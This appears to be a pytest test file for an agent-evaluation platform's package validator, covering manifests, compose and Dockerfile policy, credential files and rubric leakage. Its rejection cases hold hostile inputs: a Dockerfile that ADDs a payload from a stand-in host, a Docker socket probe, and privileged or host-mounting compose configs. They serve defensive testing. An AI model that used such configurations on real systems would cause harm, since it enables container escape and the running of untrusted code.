from pathlib import Path

import pytest

from app.core.exceptions import ValidationException
from app.services.agent_package import contract_from_dict, load_package_contract, reject_packaged_secrets
from app.services.image_builder import validate_dockerfile
from app.services.evaluation_execution_service import build_invocation_envelope


def test_manifest_is_required(tmp_path: Path):
    (tmp_path / "Dockerfile").write_text("FROM scratch\n", encoding="utf-8")
    with pytest.raises(ValidationException, match="agent-eval.yaml"):
        load_package_contract(tmp_path)


def test_single_image_remains_supported(tmp_path: Path):
    (tmp_path / "Dockerfile").write_text("FROM python:3.12-slim\n", encoding="utf-8")
    (tmp_path / "agent-eval.yaml").write_text(
        "schema_version: 1\ndeployment:\n  type: image\n  entry_service: agent\n"
        "build:\n  dockerfile: Dockerfile\n  context: .\n"
        "runtime:\n  protocol: stdio\nsecurity:\n  network: none\n", encoding="utf-8",
    )
    contract = load_package_contract(tmp_path)
    assert contract.deployment.type == "image"
    assert contract.build.mode == "dockerfile"
    assert contract.runtime.protocol == "stdio"
    assert contract_from_dict(contract.as_dict()) == contract


def test_compose_first_contract_supports_dependency_and_ephemeral_volume(tmp_path: Path):
    (tmp_path / "agent").mkdir()
    (tmp_path / "agent" / "Dockerfile").write_text("FROM python:3.12-slim\n", encoding="utf-8")
    (tmp_path / "docker-compose.yml").write_text(
        "services:\n"
        "  agent:\n    build: ./agent\n    depends_on: [mysql]\n    environment:\n      MYSQL_HOST: mysql\n"
        "  mysql:\n    image: mysql:8.4\n    environment:\n      MYSQL_ROOT_PASSWORD: local-only\n"
        "    volumes:\n      - mysql-data:/var/lib/mysql\n"
        "volumes:\n  mysql-data: {}\n", encoding="utf-8",
    )
    (tmp_path / "agent-eval.yaml").write_text(
        "schema_version: 1\ndeployment:\n  type: compose\n  file: docker-compose.yml\n  entry_service: agent\n"
        "runtime:\n  protocol: http\n  port: 8080\n  healthcheck: /health\n  invoke: /v1/evaluations/run\n"
        "security:\n  network: none\n", encoding="utf-8",
    )
    contract = load_package_contract(tmp_path)
    assert contract.deployment.type == "compose"
    assert {s.name for s in contract.deployment.services} == {"agent", "mysql"}
    mysql = next(s for s in contract.deployment.services if s.name == "mysql")
    assert mysql.volumes == (("mysql-data", "/var/lib/mysql"),)


@pytest.mark.parametrize("unsafe", [
    "services:\n  agent:\n    image: app:1\n    privileged: true\n",
    "services:\n  agent:\n    image: app:1\n    network_mode: host\n",
    "services:\n  agent:\n    image: app:1\n    volumes: ['/etc:/host']\n",
    "services:\n  agent:\n    image: app:1\n    ports: ['8080:8080']\n",
])
def test_compose_policy_rejects_host_escape(tmp_path: Path, unsafe: str):
    (tmp_path / "docker-compose.yml").write_text(unsafe, encoding="utf-8")
    (tmp_path / "agent-eval.yaml").write_text(
        "schema_version: 1\ndeployment:\n  type: compose\n  file: docker-compose.yml\n  entry_service: agent\n"
        "runtime:\n  protocol: http\n  port: 8080\n", encoding="utf-8",
    )
    with pytest.raises(ValidationException):
        load_package_contract(tmp_path)


def test_compose_requires_http_protocol(tmp_path: Path):
    (tmp_path / "docker-compose.yml").write_text("services:\n  agent:\n    image: app:1\n", encoding="utf-8")
    (tmp_path / "agent-eval.yaml").write_text(
        "schema_version: 1\ndeployment:\n  type: compose\n  file: docker-compose.yml\n"
        "runtime:\n  protocol: stdio\n", encoding="utf-8",
    )
    with pytest.raises(ValidationException, match="HTTP"):
        load_package_contract(tmp_path)


def test_dockerfile_policy_rejects_remote_add_and_docker_socket(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text("FROM alpine\nADD https://evil.invalid/payload /tmp/payload\n", encoding="utf-8")
    with pytest.raises(ValidationException, match="远程 ADD"):
        validate_dockerfile(dockerfile)
    dockerfile.write_text("FROM alpine\nRUN test -S /var/run/docker.sock\n", encoding="utf-8")
    with pytest.raises(ValidationException, match="Docker Socket"):
        validate_dockerfile(dockerfile)


def test_packaged_credentials_are_rejected(tmp_path: Path):
    (tmp_path / ".env").write_text("API_KEY=secret", encoding="utf-8")
    with pytest.raises(ValidationException, match="凭据文件"):
        reject_packaged_secrets(tmp_path)


def test_agent_envelope_never_contains_generated_or_private_rubric():
    config = {
        "language": "zh-CN",
        "output_format": "markdown",
        "generated_rubrics": [{"id": "hidden", "pass_condition": "secret answer"}],
        "rubric": {"private": [{"reference_answer": "secret"}]},
        "ground_truth": "secret",
    }
    envelope = build_invocation_envelope("eval-1", {"id": "case-1", "input": "question"}, config, 60)
    rendered = str(envelope)
    assert "rubric" not in rendered.lower()
    assert "secret" not in rendered
    assert envelope["guidance"] == {"language": "zh-CN", "output_format": "markdown", "max_output_chars": None}
